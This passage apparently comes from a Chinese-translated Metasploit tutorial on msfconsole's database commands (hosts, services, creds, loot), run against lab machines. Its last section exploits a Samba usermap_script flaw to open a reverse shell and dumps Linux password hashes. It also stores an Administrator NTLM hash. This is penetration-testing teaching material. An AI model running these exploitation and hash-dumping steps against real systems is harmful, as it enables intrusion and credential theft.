Hosts 
===== 
address         os_flavor 
-------         --------- 
172.16.194.134  XP 
172.16.194.172  Ubuntu 
Setting up Modules  
另外一个很有吸引力的特性是，它有能力查询所有条目，用于指定目的。设想如果我们希望找到
Linux 类型的主机用于扫描，我们可以使用’-S’参数. 
msf > hosts -c address,os_flavor -S Linux 
Hosts 
===== 
address         os_flavor 
-------         --------- 
172.16.194.172  Ubuntu 
msf > 
msf  auxiliary(tcp) > show options 
Module options (auxiliary/scanner/portscan/tcp): 
   Name         Current Setting  Required  Description 
   ----         ---------------  --------  ----------- 
   CONCURRENCY  10               yes       The number of concurrent ports to check per host 
   FILTER                        no        The filter string for capturing traffic 
   INTERFACE                     no        The name of the interface 
   PCAPFILE                      no        The name of the PCAP capture file to process 
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900) 
   RHOSTS                        yes       The target address range or CIDR identifier 
   SNAPLEN      65535            yes       The number of bytes to capture 
   THREADS      1                yes       The number of concurrent threads 
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds 
注意，我们未对’RHOSTS’进行设置，我们接下来会使用 hosts 命令的’-R’参数，来运行这个模
块。 
msf  auxiliary(tcp) > hosts -c address,os_flavor -S Linux -R 
Hosts 
===== 
address         os_flavor 
-------         --------- 
172.16.194.172  Ubuntu 
RHOSTS => 172.16.194.172 
msf  auxiliary(tcp) > run 
[*] 172.16.194.172:25 - TCP OPEN 
[*] 172.16.194.172:23 - TCP OPEN 
[*] 172.16.194.172:22 - TCP OPEN 
[*] 172.16.194.172:21 - TCP OPEN 
[*] 172.16.194.172:53 - TCP OPEN 
[*] 172.16.194.172:80 - TCP OPEN 
...snip... 
[*] 172.16.194.172:5432 - TCP OPEN 
[*] 172.16.194.172:5900 - TCP OPEN 
[*] 172.16.194.172:6000 - TCP OPEN 
[*] 172.16.194.172:6667 - TCP OPEN 
[*] 172.16.194.172:6697 - TCP OPEN 
[*] 172.16.194.172:8009 - TCP OPEN 
[*] 172.16.194.172:8180 - TCP OPEN 
[*] 172.16.194.172:8787 - TCP OPEN 
[*] Scanned 1 of 1 hosts (100% complete) 
[*] Auxiliary module execution completed 
如果结果中包含多个地址，这种方法也是会起作用的。 
msf  auxiliary(tcp) > hosts -R 
Hosts 
===== 
address         mac                name  os_name            os_flavor  os_sp  purpose  info  comments 
-------         ---                ----  -------            ---------  -----  -------  ----  -------- 
172.16.194.134  00:0C:29:68:51:BB        Microsoft Windows  XP                server          
172.16.194.172  00:0C:29:D1:62:80        Linux              Ubuntu            server          
RHOSTS => 172.16.194.134 172.16.194.172 
msf  auxiliary(tcp) > show options 
Module options (auxiliary/scanner/portscan/tcp): 
   Name         Current Setting                Required  Description 
   ----         ---------------                --------  ----------- 
   CONCURRENCY  10                             yes       The number of concurrent ports to check per 
host 
   FILTER                                      no        The filter string for capturing traffic 
   INTERFACE                                   no        The name of the interface 
   PCAPFILE                                    no        The name of the PCAP capture file to process 
   PORTS        1-10000                        yes       Ports to scan (e.g. 22-25,80,110-900) 
   RHOSTS       172.16.194.134 172.16.194.172  yes       The target address range or CIDR identifier 
   SNAPLEN      65535                          yes       The number of bytes to capture 
   THREADS      1                              yes       The number of concurrent threads 
   TIMEOUT      1000                           yes       The socket connect timeout in milliseconds 
如果我们的数据库中有成百上千条数据，我们可以查询 Windows 机器，并指定 RHOSTS，然后执
行 smb_version 扫描。 
Services  
查询数据库，也可以使用’services’命令。 
msf > services -h 
Usage: services [-h] [-u] [-a] [-r ] [-p ] [-s ] [-o ] [addr1 addr2 ...] 
  -a,--add          Add the services instead of searching 
  -d,--delete       Delete the services instead of searching 
  -c     Only show the given columns 
  -h,--help         Show this help information 
  -s   Search for a list of service names 
  -p   Search for a list of ports 
  -r      Only show [tcp|udp] services 
  -u,--up           Only show services which are up 
  -o          Send output to a file in csv format 
  -R,--rhosts       Set RHOSTS from the results of the search 
  -S,--search       Search string to filter by 
Available columns: created_at, info, name, port, proto, state, 
updated_at 
同 hosts 命令一样，我们可以指定显示区域.指定’-S’,可以查找一个包含指定字符串的服务. 
msf > services -c name,info 172.16.194.134 
Services 
======== 
host            name          info 
----            ----          ---- 
172.16.194.134  http          Apache httpd 2.2.17 (Win32) 
mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1  
172.16.194.134  msrpc         Microsoft Windows RPC  
172.16.194.134  netbios-ssn    
172.16.194.134  http          Apache httpd 2.2.17 (Win32) 
mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1  
172.16.194.134  microsoft-ds  Microsoft Windows XP microsoft-ds  
172.16.194.134  mysql  
msf > services -c name,info -S http 
Services 
======== 
host            name  info 
----            ----  ---- 
172.16.194.134  http  Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 
OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1  
172.16.194.134  http  Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 
OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1  
172.16.194.172  http  Apache httpd 2.2.8 (Ubuntu) DAV/2  
172.16.194.172  http  Apache Tomcat/Coyote JSP engine 1.1  
msf > services -c info,name -p 445 
Services 
======== 
host            info                                  name 
----            ----                                  ---- 
172.16.194.134  Microsoft Windows XP microsoft-ds     microsoft-ds 
172.16.194.172  Samba smbd 3.X workgroup: WORKGROUP   netbios-ssn 
msf > services -c port,proto,state -p 70-81 
Services 
======== 
host            port  proto  state 
----            ----  -----  ----- 
172.16.194.134  80    tcp    open 
172.16.194.172  75    tcp    closed 
172.16.194.172  71    tcp    closed 
172.16.194.172  72    tcp    closed 
172.16.194.172  73    tcp    closed 
172.16.194.172  74    tcp    closed 
172.16.194.172  70    tcp    closed 
172.16.194.172  76    tcp    closed 
172.16.194.172  77    tcp    closed 
172.16.194.172  78    tcp    closed 
172.16.194.172  79    tcp    closed 
172.16.194.172  80    tcp    open 
172.16.194.172  81    tcp    closed 
msf > services -s http -c port 172.16.194.134 
Services 
======== 
host            port 
----            ---- 
172.16.194.134  80 
172.16.194.134  443 
msf > services -S Unr 
Services 
======== 
host            port  proto  name  state  info 
----            ----  -----  ----  -----  ---- 
172.16.194.172  6667  tcp    irc   open   Unreal ircd  
172.16.194.172  6697  tcp    irc   open   Unreal ircd  
CSV Export  
hosts 和 services 命令让我们可以将查询的结果保存到指定 CSV 文件. 
msf > services -s http -c port 172.16.194.134 -o /root/msfu/http.csv 
[*] Wrote services to /root/msfu/http.csv 
msf > hosts -S Linux -o /root/msfu/linux.csv 
[*] Wrote hosts to /root/msfu/linux.csv 
msf > cat /root/msfu/linux.csv 
[*] exec: cat /root/msfu/linux.csv 
address,mac,name,os_name,os_flavor,os_sp,purpose,info,comments 
"172.16.194.172","00:0C:29:D1:62:80","","Linux","Debian","","server",""
,"" 
msf > cat /root/msfu/http.csv 
[*] exec: cat /root/msfu/http.csv 
host,port 
"172.16.194.134","80" 
"172.16.194.134","443" 
Creds  
‘creds’命令用于用于管理数据库中的证书. 
msf > creds -h 
Usage: creds [addr range] 
Usage: creds -a  -p  -t  -u  -P  
  -a,--add              Add creds to the given addresses instead of 
listing 
  -d,--delete           Delete the creds instead of searching 
  -h,--help             Show this help information 
  -o              Send output to a file in csv format 
  -p,--port   List creds matching this port spec 
  -s         List creds matching these service names 
  -t,--type       Add a cred of this type (only with -a). Default: 
password 
  -u,--user             Add a cred for this user (only with -a). 
Default: blank 
  -P,--password         Add a cred with this password (only with -a). 
Default: blank 
  -R,--rhosts           Set RHOSTS from the results of the search 
  -S,--search           Search string to filter by 
Examples: 
  creds               # Default, returns all active credentials 
  creds all           # Returns all credentials active or not 
  creds 1.2.3.4/24    # nmap host specification 
  creds -p 22-25,445  # nmap port specification 
  creds 10.1.*.* -s ssh,smb all 
msf > creds 
Credentials 
=========== 
host             port  user  pass         type      active? 
----             ----  ----  ----         ----      ------- 
192.168.100.140  445   wix   password124  password  true 
收集用户证书对完成一次深入的渗透测试是很重要的。如果我们收集到一些证书，我们可以使
用’creds -a’将它们加入数据库. 
msf > creds -a 172.16.194.134 -p 445 -u Administrator -P 
7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: 
[*] Time: 2012-06-20 20:31:42 UTC Credential: host=172.16.194.134 
port=445 proto=tcp sname= type=password user=Administrator 
pass=7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:
:: active=true 
msf > creds 
Credentials 
=========== 
host            port  user           pass                                              
type      active? 
----            ----  ----           ----                                              
----      ------- 
172.16.194.134  445   Administrator  
7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::  
password  true 
[*] Found 1 credential. 
Loot  
一旦你攻入一个系统，其中要做的一件事就是获取 hash 值，不管是 Windows 还是*nix 系统，
一旦成功获取 hash 值，这些信息会被存储在我们的数据库中，我们可以使用’loot’命令，查看
hash 缓存。 
msf > loot -h 
Usage: loot [-h] [addr1 addr2 ...] [-t ] 
  -t   Search for a list of types 
  -h,--help         Show this help information 
  -S,--search       Search string to filter by 
下面给个例子，进行说明. 
msf  exploit(usermap_script) > exploit 
[*] Started reverse double handler 
[*] Accepted the first client connection... 
[*] Accepted the second client connection... 
[*] Command: echo 4uGPYOrars5OojdL; 
[*] Writing to socket A 
[*] Writing to socket B 
[*] Reading from sockets... 
[*] Reading from socket B 
[*] B: "4uGPYOrars5OojdL\r\n" 
[*] Matching... 
[*] A is input... 
[*] Command shell session 1 opened (172.16.194.163:4444 -> 
172.16.194.172:55138) at 2012-06-27 19:38:54 -0400 
^Z 
Background session 1? [y/N]  y 
msf  exploit(usermap_script) > use post/linux/gather/hashdump  
msf  post(hashdump) > show options 
Module options (post/linux/gather/hashdump): 
   Name     Current Setting  Required  Description 
   ----     ---------------  --------  ----------- 
   SESSION  1                yes       The session to run this module 
on. 
msf  post(hashdump) > sessions -l 
Active sessions 
=============== 
  Id  Type        Information  Connection 
  --  ----        -----------  ---------- 
  1   shell unix               172.16.194.163:4444 -> 
172.16.194.172:55138 (172.16.194.172) 
msf  post(hashdump) > run 
[+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash 
[+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh 
[+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false 
[+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash 
[+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash 
[+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash 
[+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash 
[+] Unshadowed Password File: /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt 
[*] Post module execution completed 
msf  post(hashdump) > loot 
Loot 
==== 
host            service  type          name                   content     
info                            path 
----            -------  ----          ----                   -------     
----                            ---- 
172.16.194.172           linux.hashes  unshadowed_passwd.pwd  
text/plain  Linux Unshadowed Password File  
/root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208
.txt 
172.16.194.172           linux.passwd  passwd.tx              
text/plain  Linux Passwd File               
/root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.passwd_953644
.txt 
172.16.194.172           linux.shadow  shadow.tx              
text/plain  Linux Password Shadow File      
/root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.shadow_492948
.txt 